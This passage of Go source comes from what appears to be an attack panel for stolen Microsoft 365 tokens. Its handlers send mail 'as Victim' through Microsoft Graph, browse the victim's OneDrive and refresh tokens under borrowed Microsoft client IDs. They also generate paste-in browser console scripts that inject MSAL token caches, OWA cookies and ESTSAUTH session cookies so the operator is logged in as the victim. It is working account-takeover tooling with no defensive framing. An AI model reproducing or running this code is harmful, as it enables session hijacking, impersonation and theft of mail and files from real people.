		"connection":                       true,
		"content-security-policy":          true,
		"content-security-policy-report-only": true,
		"x-content-type-options":           true,
		"x-frame-options":                  true,
		"strict-transport-security":        true,
	}
	for k, v := range resp.Header {
		if !skip[strings.ToLower(k)] {
			w.Header()[k] = v
		}
	}
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(rawBody)))
	w.WriteHeader(resp.StatusCode)
	w.Write(rawBody)
}

// ─────────────────────────────────────────────────────────────────────────────
// Send email via Graph API
// ─────────────────────────────────────────────────────────────────────────────

func (s *HttpServer) handleDCSend(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	tok := tgt.LandingToken
	tgt.mu.Unlock()

	if r.Method == "POST" {
		r.ParseForm()
		to := strings.TrimSpace(r.FormValue("to"))
		subj := strings.TrimSpace(r.FormValue("subject"))
		body := strings.TrimSpace(r.FormValue("body"))
		isHTML := r.FormValue("html") == "1"
		ct := "Text"
		if isHTML {
			ct = "HTML"
		}
		payload := fmt.Sprintf(`{"message":{"subject":%s,"body":{"contentType":%s,"content":%s},"toRecipients":[{"emailAddress":{"address":%s}}]},"saveToSentItems":true}`,
			jsonQ(subj), jsonQ(ct), jsonQ(body), jsonQ(to))

		req, _ := http.NewRequest("POST", "https://graph.microsoft.com/v1.0/me/sendMail", strings.NewReader(payload))
		req.Header.Set("Authorization", "Bearer "+at)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			http.Error(w, "send error: "+err.Error(), http.StatusInternalServerError)
			return
		}
		resp.Body.Close()
		if resp.StatusCode == 202 {
			http.Redirect(w, r, "/dc/use/"+tok+"?sent=1", http.StatusSeeOther)
			return
		}
		// show error
		b, _ := io.ReadAll(resp.Body)
		http.Error(w, fmt.Sprintf("Graph returned %d: %s", resp.StatusCode, b), http.StatusBadGateway)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Send Email</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:18px}
label{font-size:12px;color:#888;display:block;margin-bottom:4px;margin-top:12px}
input,textarea,select{width:100%%;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:4px;padding:9px 12px;color:#e0e0e0;font-size:13px;outline:none}
input:focus,textarea:focus{border-color:#0078d4}
textarea{height:200px;resize:vertical;font-family:inherit}
.row{display:flex;gap:12px;align-items:center;margin-top:16px}
.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff}
.back{color:#888;font-size:12px;text-decoration:none}
.wrap{max-width:640px}
</style></head><body>
<div class="wrap">
<h1>Send Email as Victim</h1>
<a class="back" href="/dc/use/%s">&larr; Back to dashboard</a>
<form method="POST">
<label>To</label><input name="to" placeholder="recipient@domain.com" required>
<label>Subject</label><input name="subject" placeholder="Subject line" required>
<label>Body</label><textarea name="body" placeholder="Email body..."></textarea>
<div class="row">
<label style="margin:0;display:flex;align-items:center;gap:6px;font-size:12px;color:#aaa">
  <input type="checkbox" name="html" value="1" style="width:auto"> Send as HTML
</label>
<button class="btn" type="submit">Send</button>
</div>
</form>
</div></body></html>`, tok)
}

// ─────────────────────────────────────────────────────────────────────────────
// OneDrive file browser
// ─────────────────────────────────────────────────────────────────────────────

type driveItem struct {
	ID     string      `json:"id"`
	Name   string      `json:"name"`
	Size   int64       `json:"size"`
	Folder *struct{}   `json:"folder"`
	File   *struct {
		MimeType string `json:"mimeType"`
	} `json:"file"`
	WebURL   string `json:"webUrl"`
	Download string `json:"@microsoft.graph.downloadUrl"`
}
type driveList struct {
	Value []driveItem `json:"value"`
}

func (s *HttpServer) handleDCDrive(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	tok := tgt.LandingToken
	email := tgt.Email
	tgt.mu.Unlock()
	if at == "" {
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}

	itemID := r.URL.Query().Get("id")
	apiPath := "/me/drive/root/children"
	if itemID != "" {
		apiPath = "/me/drive/items/" + itemID + "/children"
	}

	var dl driveList
	if b, err := graphDo(at, apiPath+"?$select=id,name,size,folder,file,webUrl&$orderby=name"); err == nil {
		json.Unmarshal(b, &dl)
	}

	var rows strings.Builder
	for _, it := range dl.Value {
		icon := "📄"
		link := fmt.Sprintf(`<a href="/dc/drive/%s?id=%s" style="color:#0078d4">%s</a>`, tok, it.ID, template.HTMLEscapeString(it.Name))
		if it.Folder != nil {
			icon = "📁"
		} else {
			link = fmt.Sprintf(`<a href="%s" target="_blank" style="color:#0078d4">%s</a>`, template.HTMLEscapeString(it.WebURL), template.HTMLEscapeString(it.Name))
		}
		size := ""
		if it.Size > 0 {
			size = fmt.Sprintf("%d KB", it.Size/1024)
		}
		rows.WriteString(fmt.Sprintf(`<tr><td>%s %s</td><td style="color:#555;font-size:11px">%s</td></tr>`, icon, link, size))
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>OneDrive — %s</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:4px}
.sub{font-size:12px;color:#555;margin-bottom:18px}
table{width:100%%;border-collapse:collapse;font-size:13px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase}
td{padding:8px 10px;border-bottom:1px solid #1c1c1c;vertical-align:middle}
tr:hover td{background:#1a1a1a}
a{color:#0078d4}
.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:14px}
</style></head><body>
<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
<h1>OneDrive</h1><p class="sub">%s</p>
<table><thead><tr><th>Name</th><th>Size</th></tr></thead><tbody>
%s
</tbody></table></body></html>`,
		template.HTMLEscapeString(email), tok, template.HTMLEscapeString(email), rows.String())
}

// jsonQ returns a JSON-quoted string (for building Graph API payloads inline).
func jsonQ(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// ─────────────────────────────────────────────────────────────────────────────
// MSAL token-cache injection — /dc/inject/{token}
//
// Generates a JavaScript snippet the admin pastes into the browser console
// while on https://outlook.office.com/mail/.  MSAL finds the pre-populated
// localStorage cache on boot, uses silent auth (no crypto / PKCE needed),
// and the admin is fully logged in as the victim.
// ─────────────────────────────────────────────────────────────────────────────

// decodeJWTClaims base64-decodes the JWT payload without verifying the signature.
func decodeJWTClaims(token string) map[string]interface{} {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return nil
	}
	// JWT uses unpadded base64url
	b, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil
	}
	var claims map[string]interface{}
	json.Unmarshal(b, &claims)
	return claims
}

func jwtStr(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	if v, ok := m[key].(string); ok {
		return v
	}
	return ""
}

// extractOWAClientID fetches the OWA boot HTML and extracts the MSAL clientId
// from the embedded JSON boot config.  Falls back to the known OWA value.
func extractOWAClientID(at string) string {
	req, err := http.NewRequest("GET", "https://outlook.office.com/mail/", nil)
	if err != nil {
		return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
	}
	req.Header.Set("Authorization", "Bearer "+at)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	re := regexp.MustCompile(`"clientId"\s*:\s*"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"`)
	if m := re.FindSubmatch(body); len(m) > 1 {
		return string(m[1])
	}
	return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
}

func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	rt := tgt.RefreshToken
	idt := tgt.IDToken
	tenant := tgt.Tenant
	email := tgt.Email
	landingToken := tgt.LandingToken
	tgt.mu.Unlock()

	if at == "" {
		http.Error(w, "no token captured yet — victim has not approved", http.StatusBadRequest)
		return
	}

	// Extract OWA client ID first so we can use it in the token refresh.
	// This ensures the token's appid claim matches what OWA's MSAL expects.
	owaClientID := extractOWAClientID(at)

	// Get an OWA-scoped access token refreshed with OWA's own client ID so
	// the returned token has appid == owaClientID (MSAL validates this).
	owaAT := at
	owaRT := rt
	if rt != "" {
		if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID,
			"https://outlook.office.com/.default openid profile email offline_access"); err == nil {
			owaAT = a
			if newRT != "" {
				owaRT = newRT
			}
		} else {
			// Fall back to generic FOCI refresh
			if a, newRT, err2 := RefreshForScope(rt, tenant,
				"https://outlook.office.com/.default openid profile email offline_access"); err2 == nil {
				owaAT = a
				if newRT != "" {
					owaRT = newRT
				}
			}
			_ = err
		}
	}

	// Extract claims from ID token, fall back to access token
	claims := decodeJWTClaims(idt)
	if claims == nil {
		claims = decodeJWTClaims(owaAT)
	}

	oid := jwtStr(claims, "oid")
	tid := jwtStr(claims, "tid")
	if tid == "" {
		tid = tenant
	}
	upn := jwtStr(claims, "preferred_username")
	if upn == "" {
		upn = jwtStr(claims, "upn")
	}
	if upn == "" {
		upn = email
	}
	name := jwtStr(claims, "name")
	if name == "" {
		name = upn
	}

	// Build MSAL v2 home account ID
	homeAccountID := strings.ToLower(oid + "." + tid)
	env := "login.microsoftonline.com"

	// Build client_info (base64url of {"uid":"oid","utid":"tid"})
	ciRaw, _ := json.Marshal(map[string]string{"uid": oid, "utid": tid})
	clientInfo := base64.RawURLEncoding.EncodeToString(ciRaw)

	// OWA MSAL uses individual scopes, not /.default.
	// We write cache entries for multiple scope variants so at least one matches
	// regardless of which MSAL version / scope format OWA is using.
	scopeFromToken := jwtStr(claims, "scp") // e.g. "Mail.ReadWrite Calendars.ReadWrite openid profile email offline_access"
	scopeVariants := []string{
		"https://outlook.office.com/.default openid profile email offline_access",
		"openid profile email offline_access https://outlook.office.com/.default",
		"email https://outlook.office.com/.default offline_access openid profile", // normalized (sorted)
	}
	if scopeFromToken != "" {
		scopeVariants = append(scopeVariants, scopeFromToken)
		// Also try with full resource prefix on each short scope
		var fullScopes []string
		for _, s := range strings.Fields(scopeFromToken) {
			if !strings.Contains(s, "/") {
				fullScopes = append(fullScopes, "https://outlook.office.com/"+s)
			} else {
				fullScopes = append(fullScopes, s)
			}
		}
		scopeVariants = append(scopeVariants, strings.Join(fullScopes, " "))
	}
	// Primary scope for the main cache entry
	scope := scopeVariants[0]
	if scopeFromToken != "" {
		scope = scopeFromToken
	}

	now := fmt.Sprintf("%d", time.Now().Unix())
	exp := fmt.Sprintf("%d", time.Now().Unix()+3600)
	extExp := fmt.Sprintf("%d", time.Now().Unix()+86400)

	// MSAL v2 cache key format (all lowercase, separator "-"):
	//   account : {homeAccountId}-{env}-{realm}
	//   at      : {homeAccountId}-{env}-accesstoken-{clientId}-{realm}-{target}--
	//   rt      : {homeAccountId}-{env}-refreshtoken-{clientId}--{target}--
	//   idt     : {homeAccountId}-{env}-idtoken-{clientId}-{realm}--
	accountKey := strings.ToLower(fmt.Sprintf("%s-%s-%s", homeAccountID, env, tid))
	atKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, scope))
	rtKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, scope))
	idtKey := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, owaClientID, tid))

	idtClaimsJSON, _ := json.Marshal(claims)

	accountVal := map[string]interface{}{
		"authorityType":  "MSSTS",
		"clientInfo":     clientInfo,
		"environment":    env,
		"homeAccountId":  homeAccountID,
		"idTokenClaims":  json.RawMessage(idtClaimsJSON),
		"localAccountId": oid,
		"name":           name,
		"realm":          tid,
		"username":       upn,
		"tenantProfiles": []map[string]string{
			{"localAccountId": oid, "name": name, "realm": tid},
		},
	}
	atVal := map[string]interface{}{
		"cachedAt":          now,
		"clientId":          owaClientID,
		"credentialType":    "AccessToken",
		"environment":       env,
		"expiresOn":         exp,
		"extendedExpiresOn": extExp,
		"homeAccountId":     homeAccountID,
		"realm":             tid,
		"secret":            owaAT,
		"target":            scope,
		"tokenType":         "Bearer",
	}
	rtVal := map[string]interface{}{
		"clientId":       owaClientID,
		"credentialType": "RefreshToken",
		"environment":    env,
		"homeAccountId":  homeAccountID,
		"secret":         owaRT,
		"target":         scope,
	}
	idtVal := map[string]interface{}{
		"clientId":       owaClientID,
		"credentialType": "IdToken",
		"environment":    env,
		"homeAccountId":  homeAccountID,
		"realm":          tid,
		"secret":         idt,
	}

	entries := map[string]interface{}{
		accountKey: accountVal,
		atKey:      atVal,
		rtKey:      rtVal,
		idtKey:     idtVal,
	}

	// Write AT/RT cache entries for every scope variant so MSAL finds a match
	// regardless of which exact scope string OWA's version uses for lookup.
	for _, sv := range scopeVariants {
		if sv == scope {
			continue // already written above
		}
		extraATKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, sv))
		extraRTKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, sv))
		extraATVal := map[string]interface{}{
			"cachedAt": now, "clientId": owaClientID, "credentialType": "AccessToken",
			"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
			"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
			"target": sv, "tokenType": "Bearer",
		}
		extraRTVal := map[string]interface{}{
			"clientId": owaClientID, "credentialType": "RefreshToken",
			"environment": env, "homeAccountId": homeAccountID,
			"secret": owaRT, "target": sv,
		}
		entries[extraATKey] = extraATVal
		entries[extraRTKey] = extraRTVal
	}

	// Also add the MSAL account-keys index that some MSAL versions require
	entries["msal.account.keys"] = []string{accountKey}

	// ── Server-side OWA warm-up: hit outlook.office.com with bearer so
	// Microsoft sets its session cookies in our jar; we pass those to the
	// inject snippet so the admin's browser is fully authenticated without
	// needing the broken proxy (no cross-origin, no MetaMask SES, no crypto).
	type cookieKV struct {
		Name  string `json:"n"`
		Value string `json:"v"`
		Path  string `json:"p"`
	}
	var owaCookieKVs []cookieKV
	{
		owaJar, _ := cookiejar.New(nil)
		owaWarmClient := &http.Client{
			Jar:     owaJar,
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) > 15 {
					return http.ErrUseLastResponse
				}
				req.Header.Set("Authorization", "Bearer "+owaAT)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
				return nil
			},
		}
		// Hit /owa/ first (sets canary + client-id cookies), then /mail/
		for _, warmPath := range []string{"https://outlook.office.com/owa/", "https://outlook.office.com/mail/"} {
			wReq, _ := http.NewRequest("GET", warmPath, nil)
			wReq.Header.Set("Authorization", "Bearer "+owaAT)
			wReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
			wReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			owaWarmClient.Do(wReq) //nolint
		}
		owaURL, _ := url.Parse("https://outlook.office.com")
		for _, c := range owaJar.Cookies(owaURL) {
			owaCookieKVs = append(owaCookieKVs, cookieKV{Name: c.Name, Value: c.Value, Path: "/"})
		}
	}
	owaCookiesJSON, _ := json.Marshal(owaCookieKVs)

	// Build JS snippet:
	//   1. Set OWA session cookies (obtained server-side via bearer warm-up)
	//   2. Write MSAL v2 cache to localStorage + sessionStorage
	//   3. Reload → fully logged in
	var js strings.Builder
	entriesJSON, _ := json.Marshal(entries)
	js.WriteString("(function(){\n")
	js.WriteString("  /* 1. OWA session cookies */\n")
	js.WriteString("  var ck=")
	js.Write(owaCookiesJSON)
	js.WriteString(";\n")
	js.WriteString("  ck.forEach(function(c){try{document.cookie=c.n+'='+c.v+'; path='+c.p+'; secure';}catch(e){}});\n")
	js.WriteString("  /* 2. MSAL v2 token cache */\n")
	js.WriteString("  var d=")
	js.WriteString(string(entriesJSON))
	js.WriteString(";\n")
	js.WriteString(`  Object.keys(d).forEach(function(k){
    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);
    try{localStorage.setItem(k,v);}catch(e){}
    try{sessionStorage.setItem(k,v);}catch(e){}
  });
  console.log('%c✓ OWA session injected — reloading','color:#0a0;font-size:14px;font-weight:bold');
  setTimeout(function(){location.reload();},400);
})();`)

	snippet := js.String()

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	snippetJSON, _ := json.Marshal(snippet) // safe JS string literal
	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Session Inject — %s</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:4px}
.sub{font-size:12px;color:#666;margin-bottom:20px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
.steps{list-style:none;counter-reset:s}
.steps li{counter-increment:s;padding:10px 0 10px 38px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
.steps li:last-child{border-bottom:none}
.steps li::before{content:counter(s);position:absolute;left:0;top:10px;background:#0078d4;color:#fff;width:24px;height:24px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:24px}
.steps a{color:#0078d4}
.steps strong{color:#fff}
textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:130px;resize:none;outline:none;cursor:text}
.row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;text-decoration:none;display:inline-block}
.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
.ok{color:#5cb85c;font-size:13px;font-weight:600;display:none}
.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
.note{font-size:11px;color:#555;margin-top:8px}
</style></head><body>
<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
<h1>Inject Browser Session</h1>
<p class="sub">Full OWA access as <strong style="color:#fff">%s</strong> — cookies + tokens in one paste</p>
<div class="card">
<h2>Steps</h2>
<ol class="steps">
<li>Click <strong>Copy &amp; Open OWA</strong> — copies the script and opens outlook.office.com in a new tab</li>
<li>In that new tab press <strong>F12</strong> → <strong>Console</strong> tab</li>
<li>Paste (<strong>Ctrl+V</strong>) and press <strong>Enter</strong></li>
<li>Page reloads → you are fully logged in as <strong>%s</strong></li>
</ol>
</div>
<div class="card">
<h2>Injection Script <span style="font-size:10px;color:#444;font-weight:normal;text-transform:none;letter-spacing:0">(OWA session cookies + MSAL token cache)</span></h2>
<textarea class="code" id="ta" readonly>%s</textarea>
<div class="row">
<a class="btn" href="https://outlook.office.com/mail/" target="_blank" onclick="doCopy()">Copy &amp; Open OWA</a>
<button class="btn b2" id="cpbtn" onclick="doCopy()">Copy Only</button>
<span class="ok" id="ok">Copied!</span>
</div>
<p class="note">If copy fails: click inside the text box, press Ctrl+A then Ctrl+C, then paste in the OWA console</p>
</div>
<div class="card" style="font-size:12px;color:#555;line-height:1.9">
  <div>Target: <span style="color:#888">%s</span></div>
  <div>OWA Client ID: <span style="color:#888">%s</span></div>
  <div>Home Account: <span style="color:#888">%s</span></div>
</div>
<script>
var snippet=%s;
var ta=document.getElementById('ta');
function doCopy(){
  /* try modern clipboard API (HTTPS only) */
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(snippet).then(showOk).catch(legacyCopy);
  } else { legacyCopy(); }
}
function legacyCopy(){
  ta.select();
  ta.setSelectionRange(0,99999);
  try{
    var ok=document.execCommand('copy');
    if(ok) showOk();
  }catch(e){}
}
function showOk(){
  var o=document.getElementById('ok');
  o.style.display='inline';
  setTimeout(function(){o.style.display='none';},2500);
}
/* auto-select on click */
ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
</script>
</body></html>`,
		template.HTMLEscapeString(upn),
		template.HTMLEscapeString(landingToken),
		template.HTMLEscapeString(upn),
		template.HTMLEscapeString(snippet),
		template.HTMLEscapeString(upn),
		template.HTMLEscapeString(owaClientID),
		template.HTMLEscapeString(homeAccountID),
		string(snippetJSON),
	)
}

// handleDCESTSCookies does a server-side token refresh against login.microsoftonline.com
// with a cookie jar, collects the ESTSAUTH* session cookies that Microsoft sets, and
// renders a ready-to-paste JS script the admin can run in the browser console to inject
// those cookies and get a full authenticated session on login.microsoftonline.com.
func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	tgt.mu.Lock()
	rt := tgt.RefreshToken
	tenant := tgt.Tenant
	email := tgt.Email
	landingToken := tgt.LandingToken
	tgt.mu.Unlock()

	if rt == "" {
		http.Error(w, "no refresh token captured yet — victim has not approved", http.StatusBadRequest)
		return
	}
	if tenant == "" {
		tenant = "common"
	}

	// Make a token refresh request with a cookie jar so Microsoft sets ESTS cookies.
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 20 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	form := "grant_type=refresh_token" +
		"&refresh_token=" + url.QueryEscape(rt) +
		"&client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
		"&scope=" + url.QueryEscape("openid profile email offline_access") +
		"&claims=" + url.QueryEscape(`{"access_token":{"xms_cc":{"values":["CP1"]}}}`)

	tokenURL := "https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token"
	req, _ := http.NewRequest("POST", tokenURL, strings.NewReader(form))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	req.Header.Set("Origin", "https://login.microsoftonline.com")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	client.Do(req) //nolint — we only care about cookies in the jar

	// Also hit the authorize endpoint to get interactive ESTS cookies
	authURL := "https://login.microsoftonline.com/" + tenant +
		"/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
		"&response_type=code&redirect_uri=" + url.QueryEscape("https://login.microsoftonline.com/common/oauth2/nativeclient") +
		"&scope=" + url.QueryEscape("openid profile email offline_access") +
		"&prompt=none&login_hint=" + url.QueryEscape(email)
	req2, _ := http.NewRequest("GET", authURL, nil)
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	client.Do(req2) //nolint

	// Collect ESTS cookies from jar
	msLoginURL, _ := url.Parse("https://login.microsoftonline.com")
	allCookies := jar.Cookies(msLoginURL)

	type cookieEntry struct {
		Name     string `json:"name"`
		Value    string `json:"value"`
		Domain   string `json:"domain"`
		Path     string `json:"path"`
		Secure   bool   `json:"secure"`
		HTTPOnly bool   `json:"httpOnly"`
	}

	var entries []cookieEntry
	wantNames := map[string]bool{
		"ESTSAUTH":           true,
		"ESTSAUTHPERSISTENT": true,
		"ESTSAUTHLIGHT":      true,
		"buid":               true,
		"esctx":              true,
		"fpc":                true,
	}
	for _, c := range allCookies {
		if wantNames[c.Name] {
			entries = append(entries, cookieEntry{
				Name:     c.Name,
				Value:    c.Value,
				Domain:   ".login.microsoftonline.com",
				Path:     "/",
				Secure:   true,
				HTTPOnly: true,
			})
		}
	}

	// Build injection script matching user's reference format
	cookieJSON, _ := json.Marshal(entries)
	// base64("https://login.microsoftonline.com")
	msLoginB64 := base64.StdEncoding.EncodeToString([]byte("https://login.microsoftonline.com"))

	var scriptBuf strings.Builder
	scriptBuf.WriteString("!function(){\n")
	scriptBuf.WriteString("  let e=JSON.parse(`")
	scriptBuf.Write(cookieJSON)
	scriptBuf.WriteString("`);\n")
	scriptBuf.WriteString("  for(let o of e){\n")
	scriptBuf.WriteString("    document.cookie=o.name+'='+o.value+'; domain='+o.domain+'; path='+o.path+'; secure';\n")
	scriptBuf.WriteString("  }\n")
	scriptBuf.WriteString("  window.location.href=atob('")
	scriptBuf.WriteString(msLoginB64)
	scriptBuf.WriteString("');\n")
	scriptBuf.WriteString("}();")
	script := scriptBuf.String()

	found := len(entries) > 0
	statusNote := ""
	if !found {
		statusNote = `<div style="background:#3a1a1a;border:1px solid #7a2a2a;border-radius:4px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:#e07070">
No ESTS cookies were obtained. Microsoft may not have set them for this token type.<br>
The snippet below will run but the cookie list will be empty — try the <strong>Inject Browser Session</strong> approach instead.
</div>`
	}

	scriptJSON, _ := json.Marshal(script)
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>ESTS Cookies — %s</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:4px}
.sub{font-size:12px;color:#666;margin-bottom:20px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
.steps{list-style:none;counter-reset:s}
.steps li{counter-increment:s;padding:10px 0 10px 38px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
.steps li:last-child{border-bottom:none}
.steps li::before{content:counter(s);position:absolute;left:0;top:10px;background:#0078d4;color:#fff;width:24px;height:24px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:24px}
.steps a{color:#0078d4}.steps strong{color:#fff}
textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:120px;resize:none;outline:none;cursor:text}
.row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;text-decoration:none;display:inline-block}
.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
.ok{color:#5cb85c;font-size:13px;font-weight:600;display:none}
.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
.note{font-size:11px;color:#555;margin-top:8px}
.badge{display:inline-block;background:#107c10;color:#fff;font-size:10px;padding:2px 8px;border-radius:3px;margin-left:6px;vertical-align:middle}
</style></head><body>
<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
<h1>ESTS Login Cookies <span class="badge">%d cookies</span></h1>
<p class="sub">Inject Microsoft SSO session cookies into your browser</p>
%s
<div class="card">
<h2>Steps</h2>
<ol class="steps">
<li>Open <a href="https://login.microsoftonline.com" target="_blank"><strong>login.microsoftonline.com</strong></a> in your browser (logged out is fine)</li>
<li>Press <strong>F12</strong> → <strong>Console</strong> tab</li>
<li>Click <strong>Copy Script</strong>, paste in console, press <strong>Enter</strong></li>
<li>Page redirects to Microsoft login — you should be automatically signed in as <strong>%s</strong></li>
</ol>
</div>
<div class="card">
<h2>Injection Script</h2>
<textarea class="code" id="ta" readonly>%s</textarea>
<div class="row">
<button class="btn" onclick="doCopy()">Copy Script</button>
<a class="btn b2" href="https://login.microsoftonline.com" target="_blank" onclick="doCopy()">Copy &amp; Open Login</a>
<span class="ok" id="ok">Copied!</span>
</div>
<p class="note">If copy fails: click inside the box, press Ctrl+A then Ctrl+C</p>
</div>
<div class="card" style="font-size:12px;color:#555;line-height:1.9">
  <div>Target: <span style="color:#888">%s</span></div>
  <div>Tenant: <span style="color:#888">%s</span></div>
